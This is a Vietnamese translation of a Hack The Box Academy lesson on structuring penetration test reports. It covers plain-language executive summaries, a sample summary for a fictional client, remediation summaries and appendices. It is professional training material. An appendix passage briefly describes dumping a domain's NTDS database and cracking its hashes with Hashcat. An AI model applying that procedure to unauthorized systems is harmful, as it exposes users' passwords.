- **Nêu tên hoặc đề xuất nhà cung cấp cụ thể.** Sản phẩm bàn giao là tài liệu kỹ thuật, không phải tài liệu bán hàng. Có thể đề xuất công nghệ như EDR hay log aggregation, nhưng tránh đề xuất nhà cung cấp cụ thể của các công nghệ đó, như CrowdStrike hay Splunk. Nếu bạn có kinh nghiệm gần đây với một nhà cung cấp cụ thể và cảm thấy thoải mái chia sẻ với khách hàng, hãy làm điều đó ngoài luồng (out-of-band) và đảm bảo nói rõ rằng họ nên tự đưa ra quyết định (và có thể mời account executive của khách hàng tham gia thảo luận). Khi mô tả các lỗ hổng cụ thể, người đọc dễ nhận ra thứ như "các nhà cung cấp như VMWare, Apache, và Adobe" hơn là "vSphere, Tomcat, và Acrobat."
- **Sử dụng từ viết tắt.** IP và VPN đã trở nên phổ biến đến mức có thể chấp nhận được, nhưng sử dụng từ viết tắt cho giao thức và loại tấn công (ví dụ: SNMP, MitM) là thiếu tinh tế và sẽ làm executive summary của bạn hoàn toàn mất tác dụng với đối tượng mục tiêu.
- **Dành nhiều thời gian nói về những thứ không quan trọng hơn là các phát hiện đáng kể trong báo cáo.** Bạn có quyền định hướng sự chú ý. Đừng lãng phí nó vào những vấn đề không có tác động lớn mà bạn phát hiện được.
- **Sử dụng những từ mà không ai từng nghe qua.** Có vốn từ vựng phong phú là tốt, nhưng nếu không ai hiểu được điều bạn muốn truyền đạt hoặc họ phải tra nghĩa từ, thì đó chỉ là sự xao nhãng. Hãy thể hiện điều đó ở nơi khác.
- **Tham chiếu đến một phần kỹ thuật hơn của báo cáo.** Lý do người điều hành đọc phần này có thể chính là vì họ không hiểu chi tiết kỹ thuật, hoặc họ quyết định không có thời gian cho việc đó. Ngoài ra, không ai thích phải cuộn qua lại trong báo cáo để hiểu chuyện gì đang xảy ra.

### Thay Đổi Từ Vựng

Để đưa ra một số ví dụ về việc "viết cho đối tượng không chuyên về kỹ thuật", dưới đây là một số ví dụ về thuật ngữ kỹ thuật và từ viết tắt mà bạn có thể muốn dùng, cùng với cách diễn đạt ít kỹ thuật hơn có thể thay thế. Danh sách này không đầy đủ và cũng không phải là cách "đúng duy nhất" để mô tả những điều này — chỉ là ví dụ về cách bạn có thể diễn đạt một chủ đề kỹ thuật theo cách dễ hiểu hơn với mọi người.

- **VPN, SSH** — một giao thức dùng để quản trị từ xa an toàn
- **SSL/TLS** — công nghệ hỗ trợ duyệt web an toàn
- **Hash** — kết quả đầu ra của một thuật toán thường dùng để xác thực tính toàn vẹn của file
- **Password Spraying** — một kiểu tấn công trong đó một mật khẩu dễ đoán duy nhất được thử trên một danh sách lớn các tài khoản người dùng đã thu thập được
- **Password Cracking** — một kiểu tấn công mật khẩu offline, trong đó dạng mã hóa của mật khẩu người dùng được chuyển ngược lại thành dạng con người có thể đọc được
- **Buffer overflow/deserialization/v.v.** — một kiểu tấn công dẫn đến việc thực thi lệnh từ xa trên host mục tiêu
- **OSINT** — Thu thập Thông tin Tình báo Nguồn mở, tức là tìm kiếm/sử dụng dữ liệu về một công ty và nhân viên của công ty đó có thể tìm thấy qua công cụ tìm kiếm và các nguồn công khai khác, mà không cần tương tác với mạng bên ngoài của công ty
- **SQL injection/XSS** — một lỗ hổng trong đó dữ liệu đầu vào từ người dùng được chấp nhận mà không lọc bỏ các ký tự nhằm thao túng logic của ứng dụng theo cách không mong muốn

Đây chỉ là một vài ví dụ. Bộ từ vựng của bạn sẽ ngày càng phong phú theo thời gian khi viết nhiều báo cáo hơn. Bạn cũng có thể cải thiện phần này bằng cách đọc các executive summary mà người khác đã viết mô tả một số phát hiện tương tự mà bạn thường xuyên gặp phải. Việc này có thể là chất xúc tác giúp bạn nghĩ về một vấn đề theo cách khác. Bạn cũng có thể nhận được phản hồi từ khách hàng theo thời gian về phần này, và điều quan trọng là đón nhận phản hồi đó một cách khéo léo và cởi mở. Bạn có thể muốn phòng thủ (đặc biệt nếu khách hàng khá gay gắt), nhưng cuối cùng, họ trả tiền để bạn tạo ra một sản phẩm hữu ích cho họ. Nếu vấn đề không phải vì họ không hiểu được, hãy xem đó là cơ hội để rèn luyện và phát triển. Việc coi phản hồi của khách hàng là công kích cá nhân có thể khó tránh khỏi, nhưng đó là một trong những điều giá trị nhất mà họ có thể cho bạn.

### Ví Dụ Executive Summary

Dưới đây là một executive summary mẫu được trích từ báo cáo mẫu đi kèm module này:

> Trong quá trình internal penetration test đối với Inlanefreight, Hack The Box Academy đã xác định được bảy (7) phát hiện đe dọa đến tính bảo mật, toàn vẹn và sẵn sàng của hệ thống thông tin của Inlanefreight. Các phát hiện được phân loại theo mức độ nghiêm trọng, với năm (5) phát hiện được xếp mức rủi ro cao, một (1) mức trung bình, và một (1) mức thấp. Ngoài ra còn có một (1) phát hiện mang tính thông tin liên quan đến việc tăng cường khả năng giám sát an ninh trong mạng nội bộ.
>
> Tester nhận thấy công tác quản lý bản vá và lỗ hổng của Inlanefreight được duy trì tốt. Không có phát hiện nào trong báo cáo này liên quan đến việc thiếu các bản vá hệ điều hành hoặc bản vá bên thứ ba cho các lỗ hổng đã biết trong dịch vụ và ứng dụng có thể dẫn đến truy cập trái phép và xâm nhập hệ thống. Mỗi lỗ hổng phát hiện trong quá trình kiểm thử đều liên quan đến cấu hình sai hoặc thiếu tăng cường bảo mật (hardening), với phần lớn thuộc các nhóm xác thực yếu và phân quyền yếu.
>
> Một phát hiện liên quan đến một giao thức truyền thông mạng có thể bị "giả mạo" (spoof) để lấy mật khẩu của người dùng nội bộ, có thể dùng để truy cập trái phép nếu kẻ tấn công có thể truy cập trái phép vào mạng mà không cần thông tin đăng nhập. Trong hầu hết các môi trường doanh nghiệp, giao thức này không cần thiết và có thể được vô hiệu hóa. Nó được bật mặc định chủ yếu cho các doanh nghiệp nhỏ và vừa không có nguồn lực cho một server phân giải tên miền chuyên dụng (kiểu "danh bạ điện thoại" của mạng). Trong quá trình đánh giá, các tài nguyên này được quan sát thấy trên mạng, vì vậy Inlanefreight nên bắt đầu lập kế hoạch thử nghiệm để vô hiệu hóa dịch vụ nguy hiểm này.
>
> Vấn đề tiếp theo là một cấu hình yếu liên quan đến các tài khoản dịch vụ, cho phép bất kỳ người dùng đã xác thực nào đánh cắp một thành phần của quy trình xác thực, thường có thể đoán được offline (thông qua "cracking" mật khẩu) để lộ ra dạng mật khẩu con người đọc được của tài khoản. Các tài khoản dịch vụ loại này thường có nhiều đặc quyền hơn người dùng thông thường, nên việc lấy được mật khẩu dạng cleartext của chúng có thể dẫn đến di chuyển ngang hoặc leo thang đặc quyền, và cuối cùng là xâm nhập toàn bộ mạng nội bộ. Tester cũng nhận thấy cùng một mật khẩu được dùng để truy cập administrator trên tất cả các server trong mạng nội bộ. Điều này có nghĩa là nếu một server bị xâm nhập, kẻ tấn công có thể tái sử dụng mật khẩu đó để truy cập bất kỳ server nào khác dùng chung mật khẩu cho quyền quản trị. May mắn thay, cả hai vấn đề này đều có thể khắc phục mà không cần công cụ bên thứ ba. Active Directory của Microsoft có các thiết lập có thể dùng để giảm thiểu rủi ro các tài nguyên này bị lợi dụng bởi người dùng độc hại.
>
> Một webserver cũng được phát hiện đang chạy một ứng dụng web sử dụng thông tin đăng nhập yếu và dễ đoán để truy cập vào bảng điều khiển quản trị, có thể bị lợi dụng để truy cập trái phép vào server bên dưới. Điều này có thể bị khai thác bởi kẻ tấn công trong mạng nội bộ mà không cần tài khoản người dùng hợp lệ. Kiểu tấn công này được ghi chép rất kỹ, nên đây là mục tiêu cực kỳ dễ bị nhắm tới và có thể gây thiệt hại đáng kể, ngay cả trong tay một kẻ tấn công thiếu kỹ năng. Lý tưởng nhất, nên vô hiệu hóa quyền truy cập bên ngoài trực tiếp vào dịch vụ này, nhưng nếu không thể, nên cấu hình lại với thông tin đăng nhập cực kỳ mạnh và được thay đổi thường xuyên. Inlanefreight cũng nên cân nhắc tối đa hóa việc thu thập dữ liệu log từ thiết bị này để đảm bảo các cuộc tấn công nhắm vào nó có thể được phát hiện và xử lý nhanh chóng.
>
> Tester cũng phát hiện các thư mục chia sẻ có quyền truy cập quá rộng, nghĩa là tất cả người dùng trong mạng nội bộ có thể truy cập một lượng dữ liệu đáng kể. Dù việc chia sẻ file nội bộ giữa các phòng ban và người dùng là quan trọng cho hoạt động kinh doanh hàng ngày, việc phân quyền quá mở trên các file share có thể dẫn đến lộ thông tin bảo mật ngoài ý muốn. Ngay cả khi một file share hiện chưa chứa thông tin nhạy cảm, ai đó có thể vô tình đặt dữ liệu như vậy vào đó, nghĩ rằng nó đã được bảo vệ trong khi thực tế không phải vậy. Cấu hình này nên được thay đổi để đảm bảo người dùng chỉ có thể truy cập những gì cần thiết cho công việc hàng ngày của họ.
>
> Cuối cùng, tester nhận thấy các hoạt động kiểm thử dường như phần lớn không bị phát hiện, điều này có thể là cơ hội để cải thiện khả năng giám sát trong mạng nội bộ và cho thấy rằng một kẻ tấn công thực tế có thể không bị phát hiện nếu đạt được quyền truy cập nội bộ. Inlanefreight nên xây dựng một kế hoạch khắc phục dựa trên phần Tóm Tắt Khắc Phục của báo cáo này, xử lý tất cả các phát hiện mức cao càng sớm càng tốt theo nhu cầu của doanh nghiệp. Inlanefreight cũng nên cân nhắc thực hiện các đánh giá lỗ hổng định kỳ nếu chưa thực hiện. Sau khi các vấn đề trong báo cáo này được xử lý, một đánh giá an ninh Active Directory sâu hơn, mang tính hợp tác nhiều hơn có thể giúp xác định thêm các cơ hội để tăng cường bảo mật môi trường Active Directory, khiến kẻ tấn công khó di chuyển trong mạng hơn và tăng khả năng Inlanefreight có thể phát hiện và ứng phó với hoạt động đáng ngờ.

### Cấu Trúc Của Executive Summary

Đoạn văn dài ở trên rất tuyệt, nhưng làm sao ta viết ra được như vậy? Hãy cùng xem qua quá trình tư duy. Để phân tích, ta sẽ dùng báo cáo mẫu mà bạn có thể tải từ danh sách Resources.

Điều đầu tiên bạn thường muốn làm là tổng hợp danh sách các phát hiện và cố gắng phân loại bản chất rủi ro của từng cái. Các danh mục này sẽ là nền tảng cho những gì bạn sẽ thảo luận trong executive summary. Trong báo cáo mẫu, ta có các phát hiện sau:

- LLMNR/NBT-NS Response Spoofing — thay đổi cấu hình/tăng cường bảo mật hệ thống
- Weak Kerberos Authentication ("Kerberoasting") — thay đổi cấu hình/tăng cường bảo mật hệ thống
- Local Administrator Password Re-Use — hành vi/tăng cường bảo mật hệ thống
- Weak Active Directory Passwords — hành vi
- Tomcat Manager Weak/Default Credentials — thay đổi cấu hình/tăng cường bảo mật hệ thống
- Insecure File Shares — thay đổi cấu hình/tăng cường bảo mật hệ thống/phân quyền
- Directory Listing Enabled — thay đổi cấu hình/tăng cường bảo mật hệ thống
- Enhance Security Monitoring Capabilities — thay đổi cấu hình/tăng cường bảo mật hệ thống

Trước hết, đáng chú ý là không có vấn đề nào trong danh sách này liên quan đến thiếu bản vá, cho thấy khách hàng có thể đã đầu tư đáng kể thời gian và công sức để hoàn thiện quy trình này. Với bất kỳ ai từng làm sysadmin, bạn sẽ biết đây không phải là điều dễ dàng, nên ta nên ghi nhận nỗ lực của họ. Điều này giúp bạn tạo thiện cảm với đội sysadmin bằng cách cho ban lãnh đạo thấy công việc họ đã làm là hiệu quả, đồng thời khuyến khích ban lãnh đạo tiếp tục đầu tư vào con người và công nghệ giúp khắc phục các vấn đề còn lại.

Quay lại các phát hiện, ta có thể thấy gần như mọi phát hiện đều có hướng khắc phục là thay đổi cấu hình hoặc tăng cường bảo mật hệ thống. Gộp lại sâu hơn nữa, ta có thể kết luận rằng khách hàng này có quy trình quản lý cấu hình chưa trưởng thành (tức là họ không làm tốt việc thay đổi cấu hình mặc định trước khi đưa vào production). Vì có nhiều điều cần "gỡ rối" trong tám phát hiện, bạn không nên chỉ viết một đoạn nói rằng "cấu hình mọi thứ tốt hơn". Bạn có nhiều "đất diễn" để đi sâu vào từng vấn đề riêng lẻ và mô tả tác động (phần gây chú ý) của một số phát hiện gây thiệt hại nhiều hơn. Xây dựng một quy trình quản lý cấu hình sẽ tốn nhiều công sức, nên việc mô tả điều gì đã hoặc có thể xảy ra nếu vấn đề này không được kiểm soát là rất quan trọng.

Khi đọc từng đoạn văn, bạn có thể sẽ ánh xạ được mô tả cấp cao với phát hiện tương ứng, giúp bạn có ý tưởng về cách diễn đạt một số thuật ngữ kỹ thuật hơn theo cách mà đối tượng không chuyên vẫn theo dõi được mà không cần tra cứu. Bạn sẽ nhận thấy ta không dùng từ viết tắt, không nói về giao thức, không nhắc đến việc "vé cấp ra vé khác", hay bất cứ thứ gì tương tự. Trong một vài trường hợp, ta cũng mô tả những nhận định chung về mức độ công sức cần thiết cho việc khắc phục, những thay đổi cần thực hiện thận trọng, các biện pháp tạm thời để giám sát một mối đe dọa cụ thể, và mức độ kỹ năng cần có để thực hiện khai thác. Bạn KHÔNG cần viết một đoạn riêng cho mỗi phát hiện. Nếu báo cáo có 20 phát hiện, việc đó sẽ nhanh chóng vượt tầm kiểm soát. Hãy cố gắng tập trung vào những phát hiện có tác động lớn nhất.

Một vài lưu ý bổ sung:

- Một số quan sát bạn thực hiện trong quá trình đánh giá có thể chỉ ra một vấn đề nghiêm trọng hơn mà khách hàng có thể chưa nhận thức được. Việc cung cấp phân tích này rõ ràng là có giá trị, nhưng bạn cần cẩn trọng trong cách diễn đạt để đảm bảo không nói theo kiểu tuyệt đối chỉ vì một giả định.
- Ở cuối đoạn, bạn sẽ thấy có câu về việc dường như và cho thấy rằng khách hàng đã không phát hiện được hoạt động kiểm thử của ta. Những từ ngữ có tính "giảm nhẹ" (qualifier) này rất quan trọng vì bạn không hoàn toàn chắc chắn rằng họ đã không phát hiện được — họ có thể chỉ đơn giản là không nói cho bạn biết.
- Một ví dụ khác (nói chung, không phải trong executive summary này) là nếu bạn viết đại loại "bắt đầu lập tài liệu về các template và quy trình tăng cường bảo mật hệ thống." Câu này ngụ ý rằng họ chưa làm gì cả, điều này có thể xúc phạm nếu thực tế họ đã thử và thất bại. Thay vào đó, bạn có thể viết: "xem xét lại các quy trình quản lý cấu hình và xử lý các thiếu sót đã dẫn đến các vấn đề được xác định trong báo cáo này."

Hy vọng phần này giúp làm rõ một số quá trình tư duy khi viết executive summary và cho bạn một số ý tưởng để suy nghĩ khác đi khi mô tả sự việc. Từ ngữ mang ý nghĩa, vì vậy hãy chọn chúng cẩn thận.

## Tóm Tắt Các Khuyến Nghị (Summary of Recommendations)

Trước khi đi vào các phát hiện kỹ thuật, nên có một phần Tóm Tắt Khuyến Nghị hoặc Tóm Tắt Khắc Phục (Remediation Summary). Ở đây ta có thể liệt kê các khuyến nghị ngắn hạn, trung hạn và dài hạn dựa trên các phát hiện và tình trạng hiện tại của môi trường khách hàng. Ta cần dùng kinh nghiệm và hiểu biết về hoạt động kinh doanh, ngân sách an ninh, tình hình nhân sự của khách hàng, v.v. để đưa ra khuyến nghị chính xác. Khách hàng thường sẽ có ý kiến đóng góp về phần này, nên ta cần làm đúng, nếu không các khuyến nghị sẽ vô nghĩa. Nếu cấu trúc phần này hợp lý, khách hàng có thể dùng nó làm nền tảng cho lộ trình khắc phục. Nếu bạn chọn không làm việc này, hãy chuẩn bị tinh thần khách hàng sẽ yêu cầu bạn giúp họ sắp xếp thứ tự ưu tiên khắc phục. Điều này có thể không xảy ra mọi lúc, nhưng nếu báo cáo có 15 phát hiện mức rủi ro cao và không có gì khác, họ chắc chắn sẽ muốn biết cái nào là "cao nhất". Như câu nói: "khi mọi thứ đều quan trọng, thì không có gì quan trọng cả."

Ta nên gắn mỗi khuyến nghị với một phát hiện cụ thể, và không nên đưa vào các khuyến nghị ngắn hoặc trung hạn mà không thể hành động được bằng cách khắc phục các phát hiện được báo cáo sau đó trong báo cáo. Khuyến nghị dài hạn có thể ánh xạ về các khuyến nghị mang tính thông tin/thực hành tốt nhất như "Tạo các template bảo mật cơ bản (baseline) cho các host Windows Server và Workstation", nhưng cũng có thể là các khuyến nghị mang tính tổng quát như "Thực hiện các bài đánh giá Social Engineering định kỳ kèm buổi họp tổng kết và đào tạo nhận thức bảo mật để xây dựng văn hóa tập trung vào an ninh trong tổ chức từ trên xuống dưới."

Một số phát hiện có thể có cả khuyến nghị ngắn hạn và dài hạn liên quan. Ví dụ, nếu một bản vá cụ thể bị thiếu ở nhiều nơi, đó là dấu hiệu cho thấy tổ chức gặp khó khăn trong quản lý bản vá và có thể không có chương trình quản lý bản vá mạnh, cùng các chính sách và quy trình liên quan. Giải pháp ngắn hạn là triển khai các bản vá liên quan, trong khi mục tiêu dài hạn là xem xét lại quy trình quản lý bản vá và lỗ hổng để xử lý các thiếu sót có thể khiến vấn đề tương tự tái diễn. Trong lĩnh vực bảo mật ứng dụng, có thể thay vào đó là sửa mã nguồn trong ngắn hạn, và trong dài hạn, xem xét lại SDLC (vòng đời phát triển phần mềm) để đảm bảo bảo mật được cân nhắc đủ sớm trong quá trình phát triển, ngăn các vấn đề này lọt vào môi trường production.

## Các Phát Hiện (Findings)

Sau Executive Summary, phần Findings (Các Phát Hiện) là một trong những phần quan trọng nhất. Phần này cho ta cơ hội thể hiện công sức làm việc, vẽ nên bức tranh rủi ro cho khách hàng, cung cấp bằng chứng cho đội kỹ thuật để xác thực và tái hiện các vấn đề, và đưa ra lời khuyên khắc phục. Ta sẽ thảo luận chi tiết về phần này của báo cáo ở phần tiếp theo của module: *How to Write up a Finding* (Cách Viết Một Phát Hiện).

## Phụ Lục (Appendices)

Có những phụ lục nên xuất hiện trong mọi báo cáo, còn một số khác mang tính linh hoạt và có thể không cần thiết cho tất cả các báo cáo. Nếu bất kỳ phụ lục nào làm phình to báo cáo một cách không cần thiết, bạn có thể cân nhắc xem liệu một bảng tính bổ sung có phải là cách trình bày dữ liệu tốt hơn không (chưa kể đến khả năng sắp xếp và lọc dữ liệu tốt hơn).

### Phụ Lục Cố Định (Static Appendices)

**Phạm vi (Scope):** Thể hiện phạm vi của đánh giá (URL, dải mạng, cơ sở vật chất, v.v.). Hầu hết các kiểm toán viên mà khách hàng phải nộp báo cáo cho sẽ cần xem phần này.

**Phương pháp luận (Methodology):** Giải thích quy trình lặp lại được mà bạn tuân theo để đảm bảo các đánh giá của bạn kỹ lưỡng và nhất quán.

**Xếp hạng mức độ nghiêm trọng (Severity Ratings):** Nếu mức độ nghiêm trọng của bạn không ánh xạ trực tiếp với điểm CVSS hoặc thứ gì đó tương tự, bạn sẽ cần trình bày rõ tiêu chí cần thiết để đáp ứng các định nghĩa mức độ nghiêm trọng của mình. Đôi khi bạn sẽ phải bảo vệ điều này, nên hãy đảm bảo nó vững chắc và có thể được lý giải logic, và các phát hiện trong báo cáo được xếp hạng phù hợp.

**Lý lịch (Biographies):** Nếu bạn thực hiện đánh giá với mục đích cụ thể là đáp ứng yêu cầu tuân thủ PCI, báo cáo nên bao gồm lý lịch của nhân sự thực hiện đánh giá, với mục tiêu cụ thể là trình bày rằng consultant đủ năng lực để thực hiện đánh giá. Ngay cả khi không có yêu cầu tuân thủ, việc này cũng có thể giúp khách hàng yên tâm rằng người thực hiện đánh giá của họ biết mình đang làm gì.

### Phụ Lục Linh Hoạt (Dynamic Appendices)

**Các nỗ lực khai thác và payload (Exploitation Attempts and Payloads):** Nếu bạn từng làm gì đó trong lĩnh vực xử lý sự cố (incident response), bạn nên biết có bao nhiêu dấu vết (artifact) bị để lại sau một cuộc pentest để đội điều tra số (forensics) phải lọc qua. Hãy tôn trọng và ghi chép lại những gì bạn đã làm để nếu họ gặp sự cố, họ có thể phân biệt được đâu là do bạn, đâu là do kẻ tấn công thật. Nếu bạn tạo payload tùy chỉnh, đặc biệt nếu bạn để chúng lại trên đĩa, bạn cũng nên bao gồm chi tiết các payload đó ở đây, để khách hàng biết chính xác nơi cần kiểm tra và cần tìm gì để loại bỏ chúng. Điều này đặc biệt quan trọng đối với các payload mà bạn không thể tự dọn dẹp.

**Thông tin đăng nhập đã bị xâm nhập (Compromised Credentials):** Nếu một số lượng lớn tài khoản bị xâm nhập, nên liệt kê chúng ở đây (nếu bạn xâm nhập toàn bộ domain, có thể việc liệt kê từng tài khoản là lãng phí công sức thay vì chỉ nói "tất cả tài khoản domain") để khách hàng có thể xử lý nếu cần.

**Các thay đổi cấu hình (Configuration Changes):** Nếu bạn thực hiện bất kỳ thay đổi cấu hình nào trong môi trường của khách hàng (hy vọng bạn đã xin phép trước), bạn nên liệt kê chi tiết tất cả để khách hàng có thể hoàn tác và loại bỏ bất kỳ rủi ro nào bạn đã đưa vào môi trường (như vô hiệu hóa EDR chẳng hạn). Rõ ràng, tốt nhất là bạn tự khôi phục mọi thứ về trạng thái ban đầu và nhận được sự chấp thuận bằng văn bản từ khách hàng để thay đổi mọi thứ, nhằm tránh bị trách móc sau này nếu thay đổi của bạn gây hậu quả ngoài ý muốn cho một quy trình tạo doanh thu.

**Phạm vi bị ảnh hưởng bổ sung (Additional Affected Scope):** Nếu bạn có một phát hiện với danh sách host bị ảnh hưởng quá dài để đưa vào chính phát hiện đó, bạn thường có thể tham chiếu đến một phụ lục trong phát hiện để xem danh sách đầy đủ các host bị ảnh hưởng, nơi bạn có thể tạo bảng để hiển thị chúng theo nhiều cột. Điều này giúp báo cáo gọn gàng hơn thay vì có một danh sách gạch đầu dòng dài nhiều trang.

**Thu thập thông tin (Information Gathering):** Nếu đánh giá là External Penetration Test, ta có thể bao gồm thêm dữ liệu để giúp khách hàng hiểu về dấu vết bên ngoài (external footprint) của họ. Điều này có thể bao gồm dữ liệu whois, thông tin sở hữu domain, subdomain, email đã phát hiện, tài khoản tìm thấy trong dữ liệu rò rỉ công khai (DeHashed rất tốt cho việc này), phân tích cấu hình SSL/TLS của khách hàng, và thậm chí danh sách các cổng/dịch vụ có thể truy cập từ bên ngoài (trong một external scope lớn, bạn có thể muốn tạo bảng tính bổ sung). Dữ liệu này có thể hữu ích trong một báo cáo có ít hoặc không có phát hiện, nhưng nên truyền tải giá trị nào đó cho khách hàng chứ không chỉ là nội dung thừa thãi.

**Phân tích mật khẩu domain (Domain Password Analysis):** Nếu bạn có thể đạt được quyền Domain Admin và trích xuất được cơ sở dữ liệu NTDS, nên chạy nó qua Hashcat với nhiều wordlist và rule khác nhau, thậm chí brute-force NTLM lên đến 8 ký tự nếu giàn máy crack mật khẩu của bạn đủ mạnh. Sau khi đã cạn các nỗ lực crack, một công cụ như DPAT có thể được dùng để tạo ra một báo cáo đẹp với nhiều số liệu thống kê khác nhau. Bạn có thể chỉ muốn đưa vào một số số liệu chính từ báo cáo này (ví dụ: số lượng hash lấy được, số lượng và tỷ lệ phần trăm crack được, số lượng tài khoản đặc quyền bị crack (nghĩ đến Domain Admin và Enterprise Admin), top X mật khẩu phổ biến nhất, và số lượng mật khẩu crack được theo từng độ dài ký tự). Điều này có thể giúp làm nổi bật các chủ đề trong phần Executive Summary và Findings về mật khẩu yếu. Bạn cũng có thể muốn cung cấp cho khách hàng toàn bộ báo cáo DPAT như dữ liệu bổ sung.

## Sự Khác Biệt Giữa Các Loại Báo Cáo

Trong module này, ta chủ yếu đề cập đến tất cả các thành phần nên có trong một báo cáo Internal Penetration Test hoặc một External Penetration Test kết thúc bằng việc xâm nhập nội bộ. Một số thành phần của báo cáo (như Attack Chain) sẽ không áp dụng cho báo cáo External Penetration Test không dẫn đến xâm nhập nội bộ. Loại báo cáo này sẽ tập trung nhiều hơn vào thu thập thông tin, dữ liệu OSINT, và các dịch vụ tiếp xúc bên ngoài. Nó thường sẽ không bao gồm các phụ lục như thông tin đăng nhập bị xâm nhập, thay đổi cấu hình, hay phân tích mật khẩu domain. Một báo cáo Web Application Security Assessment (WASA) có thể sẽ chủ yếu tập trung vào phần Executive Summary và Findings, và thường nhấn mạnh vào OWASP Top 10. Một đánh giá an ninh vật lý, red team, hay social engineering thường sẽ được viết theo dạng tường thuật (narrative) nhiều hơn. Đây là một thực hành tốt để tạo các mẫu (template) cho từng loại đánh giá khác nhau, để bạn có sẵn khi loại đánh giá đó xuất hiện.

Sau khi đã đề cập đến các thành phần của báo cáo, hãy cùng đi sâu vào cách viết một phát hiện (finding) sao cho hiệu quả.

---

*Tài liệu gốc: [Components of a Report | Hack The Box Academy](https://academy.hackthebox.com/app/module/162/section/1535)*
